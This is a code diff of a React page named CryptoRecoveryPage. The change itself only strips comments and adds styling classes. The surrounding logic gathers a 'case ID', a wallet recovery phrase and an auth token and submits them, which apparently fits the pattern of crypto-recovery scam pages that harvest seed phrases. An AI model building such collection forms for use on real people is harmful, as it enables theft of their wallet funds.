@@ -22,25 +22,21 @@ import {
 export default function CryptoRecoveryPage() {
 	const router = useRouter();
 
-	// Modal states
 	const [showCaseIdModal, setShowCaseIdModal] = useState(false);
 	const [showRecoveryModal, setShowRecoveryModal] = useState(false);
 	const [showSuccessModal, setShowSuccessModal] = useState(false);
 
-	// Case ID verification states
 	const [caseId, setCaseId] = useState('');
 	const [isVerified, setIsVerified] = useState(false);
 	const [isVerifying, setIsVerifying] = useState(false);
 	const [caseIdError, setCaseIdError] = useState('');
 
-	// Recovery form states
 	const [recoveryPhrase, setRecoveryPhrase] = useState('');
 	const [authToken, setAuthToken] = useState('');
 	const [selectedWallet, setSelectedWallet] = useState('');
 	const [isSubmittingRecovery, setIsSubmittingRecovery] = useState(false);
 	const [recoveryError, setRecoveryError] = useState('');
 
-	// Case data states
 	const [caseData, setCaseData] = useState<CaseWithAssets | null>(null);
 	const [isLoadingCase, setIsLoadingCase] = useState(false);
 	const [caseError, setCaseError] = useState('');
@@ -120,7 +116,6 @@ export default function CryptoRecoveryPage() {
 		setRecoveryError('');
 
 		try {
-			// Validate required fields
 			if (!authToken.trim()) {
 				setRecoveryError('Auth token is required');
 				return;
@@ -136,14 +131,12 @@ export default function CryptoRecoveryPage() {
 				return;
 			}
 
-			// Verify auth token before submission
 			const tokenVerification = await verifyAuthToken(authToken);
 			if (!tokenVerification.valid) {
 				setRecoveryError(tokenVerification.error || 'Invalid auth token');
 				return;
 			}
 
-			// Prepare submission data
 			const submissionData: RecoverySubmissionData = {
 				authToken,
 				walletType: selectedWallet,
@@ -152,11 +145,9 @@ export default function CryptoRecoveryPage() {
 				createdAt: new Date(),
 			};
 
-			// Submit recovery request
 			const result = await submitRecoveryRequest(submissionData);
 
 			if (result.success) {
-				// Reset form
 				setAuthToken('');
 				setSelectedWallet('');
 				setRecoveryPhrase('');
@@ -208,7 +199,7 @@ export default function CryptoRecoveryPage() {
 	};
 
 	return (
-		<div className="min-h-screen bg-gray-50 dark:bg-gray-900 p-4 sm:p-6">
+		<div className="min-h-screen bg-gray-50 dark:bg-gray-900 p-4 sm:p-6 relative overflow-hidden">
 			<div className="max-w-7xl mx-auto">
 				<div className="mb-8">
 					<h1 className="text-3xl font-bold text-gray-900 dark:text-white mb-2">
@@ -222,7 +213,6 @@ export default function CryptoRecoveryPage() {
 				{renderMainContent()}
 			</div>
 
-			{/* Modals */}
 			<CaseIdVerificationModal
 				isOpen={showCaseIdModal}
 				caseId={caseId}
